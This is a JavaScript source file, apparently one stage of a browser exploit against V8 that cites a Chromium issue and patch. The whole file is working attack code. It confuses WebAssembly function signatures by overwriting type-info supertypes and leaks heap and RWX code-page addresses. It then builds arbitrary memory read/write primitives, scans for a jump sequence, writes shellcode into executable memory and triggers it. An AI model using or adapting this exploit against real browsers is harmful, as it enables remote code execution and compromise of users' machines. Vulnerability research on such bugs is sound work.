// https://issues.chromium.org/issues/421403261
// https://chromium-review.googlesource.com/c/v8/v8/+/6632487

const baseOffsets = {
    rwx_page_leak_index: 2,
    slice_size: 0x8000,

    arrayBufferBackingOffset: 0x24,
        kWasmGlobalObjectTaggedBufferOffset: 0x14,
        kFuncRefMapTypeInfoOffset: 0x14,
        kTypeInfoSupertypesOffset: 0x14,

    
}

let globalInstance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 6, 1, 96, 1, 126, 1, 126, 3, 2, 1, 0, 7, 13, 1, 9, 115, 104, 101, 108, 108, 99, 111, 100, 101, 0, 0, 10, 15, 1, 13, 0, 66, 193, 130, 133, 138, 148, 168, 208, 160, 193, 0, 11, 0, 19, 4, 110, 97, 109, 101, 1, 12, 1, 0, 9, 115, 104, 101, 108, 108, 99, 111, 100, 101])));


function leak_base_pointer(offsets, primitives) {
    // Leak the base pointer from the PartitionAlloc meta page
    let buf = new BigUint64Array(100);
    let partition_page = ((primitives.cagedRead(primitives.addrOf(buf.buffer) + BigInt(offsets.arrayBufferBackingOffset)) >> 24n) & 0xffffffff00000000n) | 0x1000n;
    primitives.cagedWrite(primitives.addrOf(buf.buffer) + BigInt(offsets.arrayBufferBackingOffset), partition_page << 24n);
    return (new BigUint64Array(buf.buffer)[4] & 0xffffffff00000000n) - (partition_page & 0xffffffff00000000n);
}



function leak_wasm_pointers(offsets, primitives) {
    function getPtr(obj) {
        return Number(primitives.addrOf(obj));
    }
    function getField(obj, offset) {
        return Number(primitives.cagedRead32(BigInt(obj) + BigInt(offset)))
    }
    function setField(obj, offset, value) {
        // let v = primitives.cagedRead(BigInt(obj) + BigInt(offset));
        // let _v = (v & 0xffffffff00000000n) | BigInt(value);
        primitives.cagedWrite32(BigInt(obj) + BigInt(offset), value);
    }
    function extract_wasmglobal_value(global) {
        const kFixedArrayElement0Offset = 0x8;

        let pbuf = getField(getPtr(global), offsets.kWasmGlobalObjectTaggedBufferOffset);
        let pval = getField(pbuf, kFixedArrayElement0Offset);
        return pval;
    }
    function set_supertype(sub_fn, super_fn) {
        const kMapOffset = 0;
        let g = new WebAssembly.Global({ value: 'anyfunc', mutable: true });

        g.value = sub_fn;
        let funcref_sub = extract_wasmglobal_value(g);                    // WASM_FUNC_REF_TYPE

        let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
        let typeinfo_sub = getField(map_sub, offsets.kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE

        g.value = super_fn;
        let funcref_sup = extract_wasmglobal_value(g);
        let map_sup = getField(funcref_sup, kMapOffset);

        // typeinfo_sub.supertypes[0] = map_sup
        setField(typeinfo_sub, offsets.kTypeInfoSupertypesOffset, map_sup);

    }

    let count = 600;
    let builder = new WasmModuleBuilder();

    let $importJsLeak = builder.addImport('js', 'leak', makeSig(new Array(count).fill(kWasmI64), []));
    let $sig1 = builder.addType(makeSig([], new Array(count).fill(kWasmI32)), kNoSuperType, false);
    let $sig2 = builder.addType(makeSig([], new Array(count).fill(kWasmI64)), kNoSuperType, false);

    let $conf1 = builder.addFunction('conf1', $sig1).addBody([
        ...new Array(count).fill(0).flatMap(() => [
            ...wasmI32Const(0x41)
        ]),

    ]).exportFunc();

    let $conf2 = builder.addFunction('conf2', $sig2).addBody([
        ...new Array(count).fill(0).flatMap(() => [
            ...wasmI64Const(BigInt(0x42))
        ]),
    ]).exportFunc();

    let $confFuncTable = builder.addTable(kWasmAnyFunc, 1, 1, [kExprRefFunc, ...wasmSignedLeb($conf1.index)]);

    let $main = builder.addFunction('main', makeSig([], []))
        .addBody([
            ...wasmI32Const(0),
            kExprCallIndirect, ...wasmSignedLeb($sig2), ...wasmSignedLeb($confFuncTable.index),

            kExprCallFunction, $importJsLeak,
            // ...new Array(count).fill(0).flatMap(() => [
            //     kExprDrop,
            // ]),
        ]).exportFunc();


    // Seed memory below the stack pointer with WASM RWX addresses
    let $recFuncIndex = $main.index + 1;
    let $recFuncSig = builder.addType(makeSig([kWasmI32], []))
    let $recFuncTable = builder.addTable(kWasmAnyFunc, 1, 1, [kExprRefFunc, ...wasmSignedLeb($recFuncIndex)]); // Function index 0


    builder.addFunction('recFunc', makeSig([kWasmI32], []))
        .addBody([
            kExprLocalGet, 0,
            kExprI32Const, ...wasmSignedLeb(0x2000),
            kExprI32Eq,
            kExprIf, kWasmVoid,
            kExprReturn,
            kExprEnd,

            // Decrement the argument by 1
            kExprLocalGet, 0,
            kExprI32Const, 0x01,
            kExprI32Add,
            ...wasmI32Const(0),
            kExprCallIndirect, ...wasmSignedLeb($recFuncSig), ...wasmSignedLeb($recFuncTable.index),

            kExprLocalGet, 0,
            kExprI32Const, ...wasmSignedLeb(0),
            kExprI32Eq,
            kExprIf, kWasmVoid,
            // Call the main function
            kExprCallFunction, $main.index,
            kExprEnd,
        ])
        .exportFunc();


    let instance = builder.instantiate({
        "js": {
            "leak": (...args) => {
                let e = new Error();
                e.args = Array.from(args);
                throw e;
            }
        }
    });

    set_supertype(instance.exports.conf1, instance.exports.conf2);


    let m = new Map();
    try {
        instance.exports.recFunc(0);
    }
    catch (e) {
        e.args.forEach((arg, i) => {
            arg &= 0xffffffff00000000n;
            if (m.has(arg)) {
                m.set(arg, m.get(arg) + 1);
            }
            else {
                m.set(arg, 1);
            }
        });
    }

    let entries = Array.from(m.entries());
    let c = 0;
    let i = 0;
    let output = '';
    for (let [addr, count] of entries) {
        if (count > c) {
            c = count;
        }
        if (addr > 0 && count > 10) {
            output += `${i}: ${to_hex(addr)}: ${count}\n`;
        }
        i += 1;
    }

    return entries.map(([addr, _]) => addr);
}

function memPrimitiveFactory(offsets, primitives, base_addr, cache_buster) {
    function getPtr(obj) {
        return Number(primitives.addrOf(obj));
    }
    function getField(obj, offset) {
        return Number(primitives.cagedRead32(BigInt(obj) + BigInt(offset)))
    }
    function setField(obj, offset, value) {
        // let v = primitives.cagedRead(BigInt(obj) + BigInt(offset));
        // let _v = (v & 0xffffffff00000000n) | BigInt(value);
        primitives.cagedWrite32(BigInt(obj) + BigInt(offset), value);
    }
    function extract_wasmglobal_value(global) {
        const kFixedArrayElement0Offset = 0x8;

        let pbuf = getField(getPtr(global), offsets.kWasmGlobalObjectTaggedBufferOffset);
        let pval = getField(pbuf, kFixedArrayElement0Offset);
        return pval;
    }
    function set_supertype(sub_fn, super_fn) {
        const kMapOffset = 0;
        let g = new WebAssembly.Global({ value: 'anyfunc', mutable: true });

        g.value = sub_fn;
        let funcref_sub = extract_wasmglobal_value(g);                    // WASM_FUNC_REF_TYPE

        let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
        let typeinfo_sub = getField(map_sub, offsets.kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE

        g.value = super_fn;
        let funcref_sup = extract_wasmglobal_value(g);
        let map_sup = getField(funcref_sup, kMapOffset);

        // typeinfo_sub.supertypes[0] = map_sup
        setField(typeinfo_sub, offsets.kTypeInfoSupertypesOffset, map_sup);

    }

    let builder = new WasmModuleBuilder();
    builder.addMemory(1, 1, false);
    builder.exportMemoryAs('wasm_memory');

    let $u8arr = builder.addArray(kWasmI8, true);
    let $sig_i_l = builder.addType(kSig_i_l, kNoSuperType, false);
    let $sig_l_l = builder.addType(kSig_l_l, kNoSuperType, false);
    let $sig_u8arr_i = builder.addType(makeSig([kWasmI32], [wasmRefType($u8arr)]));

    builder.addFunction('fn_i_l', $sig_i_l).addBody([
        ...wasmI32Const(Number(BigInt(cache_buster) & 0xffffffffn)),
    ]).exportFunc();

    let $fn_l_l = builder.addFunction('fn_l_l', $sig_l_l).addBody([
        kExprLocalGet, 0,
    ]).exportFunc();

    let $t = builder.addTable(kWasmAnyFunc, 1, 1, [kExprRefFunc, ...wasmSignedLeb($fn_l_l.index)]);

    builder.addFunction('alloc_u8arr', $sig_u8arr_i).addBody([
        kExprLocalGet, 0,
        kGCPrefix, kExprArrayNewDefault, $u8arr,
    ]).exportFunc();

    builder.addFunction('copy_out', makeSig([wasmRefType($u8arr), kWasmI32, kWasmI64], []))
        .addLocals(kWasmI32, 1)
        .addBody([
            // Set counter to 0
            ...wasmI32Const(0),
            kExprLocalSet, 3,

            kExprBlock, kWasmVoid,
            kExprLoop, kWasmVoid,
            // Check if length reached
            kExprLocalGet, 3,
            kExprLocalGet, 1,
            kExprI32Sub,
            kExprI32Eqz,
            kExprBrIf, 1,


            kExprLocalGet, 3,      // offset into memory

            // Confuse kWasmI64 address to kWasmI32
            kExprLocalGet, 0,      // get u8arr
            kExprLocalGet, 2,      // i64 address
            kExprLocalGet, 3,
            kExprI64UConvertI32,
            kExprI64Add,           // add counter to address
            ...wasmI32Const(0),
            kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),

            // Read byte from confused address
            kGCPrefix, kExprArrayGetU, ...wasmSignedLeb($u8arr),
            // Store byte into wasm memory
            kExprI32StoreMem8, 0, 0,

            // increment counter
            kExprLocalGet, 3,
            ...wasmI32Const(1),
            kExprI32Add,
            kExprLocalSet, 3,

            kExprBr, 0,
            kExprEnd,
            kExprEnd,
        ]).exportFunc();


    builder.addFunction('copy_in', makeSig([wasmRefType($u8arr), kWasmI32, kWasmI64], []))
        .addLocals(kWasmI32, 1)
        .addBody([
            // Set counter to 0
            ...wasmI32Const(0),
            kExprLocalSet, 3,

            kExprBlock, kWasmVoid,
            kExprLoop, kWasmVoid,
            // Check if length reached
            kExprLocalGet, 3,
            kExprLocalGet, 1,
            kExprI32Sub,
            kExprI32Eqz,
            kExprBrIf, 1,

            kExprLocalGet, 0,      // get u8arr

            // Confuse kWasmI64 address to kWasmI32
            kExprLocalGet, 2,      // i64 address
            kExprLocalGet, 3,
            kExprI64UConvertI32,
            kExprI64Add,           // add counter to address
            ...wasmI32Const(0),
            kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),

            // Read byte from memory
            kExprLocalGet, 3,      // offset into memory
            kExprI32LoadMem8U, 0, 0,

            // Store byte into confused address
            kGCPrefix, kExprArraySet, ...wasmSignedLeb($u8arr),

            // increment counter
            kExprLocalGet, 3,
            ...wasmI32Const(1),
            kExprI32Add,
            kExprLocalSet, 3,

            kExprBr, 0,
            kExprEnd,
            kExprEnd,
        ]).exportFunc();


    let instance = builder.instantiate();
    let { fn_i_l, fn_l_l, alloc_u8arr, copy_in, copy_out, wasm_memory } = instance.exports;

    // set $sig_l_l <: $sig_i_l
    set_supertype(fn_l_l, fn_i_l);

    // alloc u8arr and set length to 0xffffffff
    let u8arr = alloc_u8arr(0x100);
    setField(getPtr(u8arr), 8, 0xffffffff);
    // %DebugPrint(u8arr);

    let MASK64 = (1n << 64n) - 1n;
    function wasm_copy_out(length, ptr) {
        let xaddr = BigInt(base_addr) + BigInt(getPtr(u8arr));
        copy_out(u8arr, length, (ptr - xaddr - 0x0bn) & MASK64)
    }

    function wasm_copy_in(length, ptr) {
        let xaddr = BigInt(base_addr) + BigInt(getPtr(u8arr));
        copy_in(u8arr, length, (ptr - xaddr - 0x0bn) & MASK64)
    }

    return { wasm_copy_in, wasm_copy_out, wasm_memory }
}

const COUNT = 200;
let instances = new Array(COUNT);
export async function execute(version_hint, primitives, iomem) {
    await console.log(`Using post WasmConfuseReturnSignature`);
    let offsets = init(baseOffsets, version_hint);

    let rwx_addr = 0n;
    let base_addr = leak_base_pointer(offsets, primitives);
    let rwx_pointer = leak_wasm_pointers(offsets, primitives)[offsets.rwx_page_leak_index] + 0x100000000n;


    await console.log('Base address:', to_hex(base_addr));
    await console.log('RWX high address:', to_hex(rwx_pointer));

    {
        const SIZE = 0x80000; // Results in 0x00400000 length rwx pages

        let start = Date.now();
        try {
            const builder = new WasmModuleBuilder();
            let body = new Uint8Array(SIZE);
            body.fill(kExprNop);

            for (let [i, v] of wasmI32Const(254).entries()) body[i] = v;
            let content = [...wasmI32Const(1), kExprI32Shl];
            for (let index = 6; index < body.length - content.length - 1;) {
                for (let b of content) body[index++] = b;
            }
            body[body.length - 1] = kExprEnd;
            builder.addFunction("trigger", kSig_i_l).exportFunc().body = body;
            builder.addFunction("main1", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main2", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main3", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main4", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main5", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main6", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main7", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main8", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main9", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main10", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main11", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main12", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main13", kSig_i_v).exportFunc().body = body;
            builder.addFunction("main14", kSig_i_v).exportFunc().body = body;

            let template = builder.toArray();
            let bodyI32ConstIndex = template.indexOf(254);
            let wasmCode = new Uint8Array(template);
            // console.log(bodyI32ConstIndex);
            // console.log(wasmCode);

            for (let x = 0; x < instances.length; x++) {
                wasmCode[bodyI32ConstIndex] = x;
                instances[x] = new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
            }

            await console.log(`Completed in ${Date.now() - start}ms`);
        }

        catch (e) {
            await console.log(`Error`, e.stack || e);
        }
    }

    let needle = [0xe9, null, null, null, null, 0xcc, 0xcc, 0xcc];
    let cache_buster = 0xff0000;
    scan_loop:
    for (let addr = 0; ; addr -= offsets.slice_size) {
        // if (addr % 0x400000 == 0)
        //     await console.log(to_hex(rwx_pointer + BigInt(addr)));
        let { wasm_copy_out, wasm_memory } = memPrimitiveFactory(offsets, primitives, base_addr, BigInt(cache_buster++));
        let ui8_wasmmemory = new Uint8Array(wasm_memory.buffer);

        // await console.log(`Scanning memory at offset ${to_hex(trusted_addr + BigInt(addr))}...`);
        // Load the next 4096 bytes into the slice in case we need to read data accross the slice boundary
        wasm_copy_out(offsets.slice_size, rwx_pointer + BigInt(addr));
        // slice.set(ui8_wasmmemory.slice(0, offsets.slice_size), offsets.slice_size);

        // await console.log(`Scanning memory at offset ${to_hex(trusted_addr + BigInt(addr))} for ${to_hex(needle)}...`);

        // Scan the slice
        let _i = 0;
        for (let i = 0; i < offsets.slice_size - needle.length; i += 1) {
            let val = ui8_wasmmemory[i];
            if (val == needle[_i] || needle[_i] == null) {
                _i += 1;
                if (_i >= needle.length) {
                    rwx_addr = rwx_pointer + BigInt(addr + i - _i + 1);
                    await console.log(`Found needle at address ${to_hex(rwx_addr)}`);
                    break scan_loop;
                }
            }
            else {
                _i = 0;
            }
        }
    }

    if (rwx_addr == 0n) {
        throw new Error("Failed to find RWX address");
    }


    let { wasm_copy_in, wasm_memory } = memPrimitiveFactory(offsets, primitives, base_addr, 0xffffffffn);
    let wasmmemory = new Uint8Array(wasm_memory.buffer);


    wasmmemory.set(shellcode);
    wasm_copy_in(shellcode.length, rwx_addr);

    let iomemAddr = primitives.addrOf(iomem.buffer);
    let iomemBacking = BigInt(primitives.cagedRead(iomemAddr + BigInt(offsets.arrayBufferBackingOffset)) >> 24n) + base_addr;

    await console.log('Triggering...');

    for (let i = 0; i < instances.length; i++) {
        instances[i].exports.trigger(iomemBacking);
    }
    await console.log(cleanShellcodeOutput(iomem));
}